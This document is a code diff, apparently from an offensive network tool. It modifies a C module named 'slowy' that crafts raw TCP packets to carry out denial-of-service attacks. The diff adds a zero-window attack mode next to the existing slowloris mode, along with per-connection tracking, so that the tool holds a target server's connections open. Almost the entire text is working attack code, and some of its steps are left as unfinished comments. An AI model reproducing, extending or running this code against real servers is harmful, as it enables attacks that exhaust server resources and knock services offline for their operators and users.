@@ -39,23 +39,25 @@
 
 #define BUFSIZE    2048
 
-typedef struct _tag_SLOWY_CFG {
-  INET_ADDR   shost;
-  INET_ADDR   dhost;
-  unsigned    timeout;
-  char       *payload;
-  unsigned    payload_size;
-  LN_CONTEXT *lnc;
-} SLOWY_CFG;
-
 typedef struct _tag_TCPCON {
   int         sport;
   int         timestamp;
-  union {
-    int       winsize;  /* current win size */
-    int       sent;     /* offset sent */
-  } status;
+  int         mss;
+  int         winsize;  /* current win size */
+  int         sent;     /* offset sent */
+  struct _tag_TCPCON *next;
 } TCP_CON;
+
+typedef struct _tag_SLOWY_CFG {
+  INET_ADDR   shost;
+  INET_ADDR   dhost;
+  int         zerowin;
+  unsigned    timeout;
+  char       *payload;
+  unsigned    payload_size;
+  TCP_CON    *conns[256];
+  LN_CONTEXT *lnc;
+} SLOWY_CFG;
 
 #define ip_protocol(x) (((struct iphdr *) (x))->protocol)
 #define ip_header(x)   ((struct iphdr *)  (x))
@@ -105,7 +107,9 @@ static void slowy__listen(THREAD_WORK *tw)
     && tcp_header(m->b)->ack != 0)
     {
       /* register connection */
-      /* TODO */
+      conn_new(tc, tcp_header(m->b)->dest);
+
+      /* get mss */
 
       /* send handshake */
       ln_send_tcp_packet(tc->lnc,
@@ -117,15 +121,34 @@ static void slowy__listen(THREAD_WORK *tw)
                          ntohl(tcp_header(m->b)->seq) + 1,
                          NULL, 0);
 
-      /* (slowloris) first data TCP packet (random size) */
-      ln_send_tcp_packet(tc->lnc,
-                         &tc->shost.addr.in.inaddr, ntohs(tcp_header(m->b)->dest),
-                         &tc->dhost.addr.in.inaddr, tc->dhost.port,
-                         TH_ACK | TH_PUSH,
-                         ntohs(tcp_header(m->b)->window),
-                         ntohl(tcp_header(m->b)->ack_seq),
-                         ntohl(tcp_header(m->b)->seq) + 1,
-                         (char *) tc->payload, tc->payload_size);
+      if(tc->zerowin)
+      {
+        /* (zerowin) */
+
+        /* send request in one TCP packet */
+        ln_send_tcp_packet(tc->lnc,
+                           &tc->shost.addr.in.inaddr, ntohs(tcp_header(m->b)->dest),
+                           &tc->dhost.addr.in.inaddr, tc->dhost.port,
+                           TH_ACK | TH_PUSH,
+                           ntohs(tcp_header(m->b)->window),
+                           ntohl(tcp_header(m->b)->ack_seq),
+                           ntohl(tcp_header(m->b)->seq) + 1,
+                           (char *) tc->payload, tc->payload_size);
+      } else {
+        /* (slowloris) */
+
+        /* first data TCP packet (random size) */
+        ln_send_tcp_packet(tc->lnc,
+                           &tc->shost.addr.in.inaddr, ntohs(tcp_header(m->b)->dest),
+                           &tc->dhost.addr.in.inaddr, tc->dhost.port,
+                           TH_ACK | TH_PUSH,
+                           ntohs(tcp_header(m->b)->window),
+                           ntohl(tcp_header(m->b)->ack_seq),
+                           ntohl(tcp_header(m->b)->seq) + 1,
+                           (char *) tc->payload, tc->payload_size);
+
+        /* set timeout */
+      }
     } else
     if(tcp_header(m->b)->fin != 0
     || tcp_header(m->b)->rst != 0)
